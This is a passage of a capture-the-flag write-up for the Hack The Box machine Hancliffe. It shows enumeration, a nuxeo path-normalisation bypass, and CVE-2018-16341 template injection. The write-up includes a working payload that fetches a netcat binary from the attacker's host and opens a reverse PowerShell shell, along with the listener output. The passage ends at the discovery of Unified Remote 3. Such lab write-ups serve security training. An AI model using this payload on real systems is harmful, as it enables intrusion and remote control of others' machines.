---
title:     "Hack The Box - Hancliff"
tags: [windows,hard,nuxeo,ssti,path normalization,unified remote,cve,firefox,binex,pwn,eggunter]
categories: HackTheBox
---
[![00_info_card](/img/hancliff/00_info_card.png)](/img/hancliff/00_info_card.png)

Hancliffe is a hard rated machine on HackTheBox created by [Revolt](https://www.hackthebox.eu/home/users/profile/189435). For the user part we will abuse a path normalisation vulnerability and a CVE in nuxeo to achieve RCE and a foothold on the machine. On the machine the running `Unified Remote 3` version has another know vulnerability which gives us a shell as clara. For the root part we will find credentials for a password manager in clara's firefox data. This let's us login via PSRemote as the development user, who has access to a directory with an application running as administrator. This application has a buffer overflow vulnerability which we can abuse to achieve a reverse shell as administrator on the machine.

# User

## Nmap

As usual we start our enumeration of with a nmap scan against all ports followed by a script and version detection scan against the open ones to get an initial overview of the attack surface.

`All ports`
```
$ sudo nmap -p- -T4 10.129.95.247
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-10 16:43 GMT
Nmap scan report for hancliffe.htb (10.129.95.247)
Host is up (0.066s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
8000/tcp open  http-alt
9999/tcp open  abyss

Nmap done: 1 IP address (1 host up) scanned in 290.27 seconds
```

`Scrip and version`
```
$ sudo nmap -p80,8000,9999 -sC -sV 10.129.95.247
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-10 16:49 GMT
Nmap scan report for hancliffe.htb (10.129.95.247)
Host is up (0.027s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.21.0
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.21.0
8000/tcp open  http    nginx 1.21.0
|_http-title: HashPass | Open Source Stateless Password Manager
|_http-server-header: nginx/1.21.0
9999/tcp open  abyss?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBPr
ogNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:
|     Welcome Brankas Application.
|     Username: Password:
|   NULL:
|     Welcome Brankas Application.
|_    Username:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.92%I=7%D=10/10%Time=61631994%P=x86_64-pc-linux-gnu%r(N
...[snip]...
F:sword:\x20")%r(NotesRPC,31,"Welcome\x20Brankas\x20Application\.\nUserna
SF:me:\x20Password:\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.03 seconds
```

## Nuxeo

From the open ports the web ports seem promising so we start there. Going over to port 80 we see the default nginx hosting page.

[![01_nginx_home](/img/hancliff/01_nginx_home.png)](/img/hancliff/01_nginx_home.png)

On port 8000 there is an installation of a password manager running which doesn't seem of much use just yet.

[![02_hashpass_home](/img/hancliff/02_hashpass_home.png)](/img/hancliff/02_hashpass_home.png)

Running a gobuster scan on the application on port 80 we can identify a maintenance directory which get's redirected to `/nuxeo/Maintenance/`.

```
$ gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://hancliffe.htb/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hancliffe.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/10/10 17:28:57 Starting gobuster in directory enumeration mode
===============================================================
/.                    (Status: 200) [Size: 612]
/maintenance          (Status: 302) [Size: 0] [--> /nuxeo/Maintenance/]
/con                  (Status: 500) [Size: 494]
/nul                  (Status: 500) [Size: 494]
```

Looking for recent vulnerabilities in nuxeo we find [CVE-2018-16341](https://github.com/mpgn/CVE-2018-16341). Going over to `/maintenance` it just displays a `we'll be back soon` page.

[![03_nginx_maintenance](/img/hancliff/03_nginx_maintenance.png)](/img/hancliff/03_nginx_maintenance.png)

The application does howerver perform a dangerous path normalisation which let's us access the directory one path up leading to access to the `login.jsp` page mentioned in the PoC exploit of the CVE. This page also displays the running version of nuxeo which seems to be promising for the vulnerability to be present.

[![04_nuxeo_login](/img/hancliff/04_nuxeo_login.png)](/img/hancliff/04_nuxeo_login.png)

Testing for the SSTI with a simple payload we can see that our code gets evaluated, confirming our suspicion.

[![06_nuxeo_ssti_poc](/img/hancliff/06_nuxeo_ssti_poc.png)](/img/hancliff/06_nuxeo_ssti_poc.png)

Following the PoC of the exploit we can build a payload adding an additional parameter in the `exec` part. This let's us move our complete payload to the end of the request.

```
/maintenance/..;/login.jsp/pw${''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(param.x)}.xhtml?x=powershell.exe+iwr+http://10.10.14.74/nc64.exe+-o+C:/windows/temp/c.exe;C:/windows/temp/c.exe+-e+powershell+10.10.14.74+7575
```

We start a python webserver to host our netcat binary and listen on the port we want to recieve the reverse shell.

```
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
$ rlwrap nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

Now we can send the request in burp, url encoding the whole SSTI part of the payload to safely send bad characters.

[![07_nuxeo_burp_rev](/img/hancliff/07_nuxeo_burp_rev.png)](/img/hancliff/07_nuxeo_burp_rev.png)

We get a hit on our web server for the `nc64.exe` binary and almost instantly after a reverse shell on our listener as `svc_account`

```
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.95.247 - - [10/Oct/2021 19:49:06] "GET /nc64.exe HTTP/1.1" 200 -
10.129.95.247 - - [10/Oct/2021 19:50:10] "GET /nc64.exe HTTP/1.1" 200 -
```

```
$ rlwrap nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
Ncat: Connection from 10.129.95.247.
Ncat: Connection from 10.129.95.247:49762.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Nuxeo> whoami
hancliffe\svc_account
```

## Unified Remote 3

Looking for unusual installed programs we find `Unified Remote 3`.

```
PS C:\Nuxeo > ls '\Program Files (x86)\ '

    Directory: C:\Program Files (x86)


d-----          6/3/2021   8:09 PM                Microsoft
d-----         12/7/2019   6:48 AM                Microsoft.NET
d-----         6/26/2021  10:15 PM                Mozilla Maintenance Service
d-----         6/12/2021   2:51 AM                MSBuild
d-----         6/12/2021   2:51 AM                Reference Assemblies
d-----         6/12/2021  12:21 AM                Unified Remote 3
d-----          4/9/2021   6:48 AM                Windows Defender
d-----         7/18/2021  12:20 AM                Windows Mail
d-----         12/7/2019   6:44 AM                Windows NT
d-----          4/9/2021   6:48 AM                Windows Photo Viewer
d-----         12/7/2019   1:25 AM                WindowsPowerShell

```
